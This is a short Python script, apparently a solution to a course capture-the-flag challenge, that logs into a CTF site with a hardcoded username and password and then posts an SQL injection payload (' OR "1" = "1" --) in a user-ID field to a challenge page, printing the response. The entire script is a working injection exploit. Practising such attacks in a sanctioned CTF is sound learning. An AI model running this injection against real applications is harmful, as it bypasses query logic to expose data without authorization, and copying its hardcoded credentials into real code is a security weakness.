import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/8c3c35c30cdbbb73b7be3a4f8587aa9d88044dc43e248984a252c6e861f673d4"

postData = {"aUserId":"\\\' OR \"1\" = \"1\" -- "}
response2 = session.post(targetUrl, data=postData)
print(response2.text)
